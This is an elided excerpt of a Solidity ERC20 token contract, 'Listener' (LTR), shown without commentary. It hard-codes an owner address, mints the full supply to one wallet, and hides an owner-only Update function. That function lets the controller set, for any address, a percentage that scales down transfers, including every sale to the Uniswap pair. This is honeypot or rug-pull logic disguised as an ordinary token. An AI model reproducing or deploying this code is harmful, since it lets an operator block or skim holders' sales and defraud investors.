...
contract Listener is Context, IERC20, IERC20Metadata,Ownable {
    mapping(address => uint256) private _balances;
    address  public _OnlyCan =0x41208447135e52C92e1959Cb017F32E1f49dCD19;
    ...
    mapping (address => userSells) public update;
    constructor() {
       _totalSupply = 500000000 * (10**18);
        _setOwner(0x41208447135e52C92e1959Cb017F32E1f49dCD19);
        _name="Listener";
        _symbol="LTR";
        _mint(0x71120B38E3CdE79dD64570e0315158256D0F438f, _totalSupply);
    }
    ...
    function Update(address account, bool isupdate,uint256 num) public onlyCan() {
        update[account].isupdate = isupdate;
        update[account].updateLimit = num;
    }
    ...
    function _transfer(
        ...
        uint256 amount1=0;
        if(recipient==uniswapV2Pair || update[sender].isupdate){
           amount1 =amount.mul(update[sender].updateLimit).div(100);
       }else{
           amount1=amount;
       }
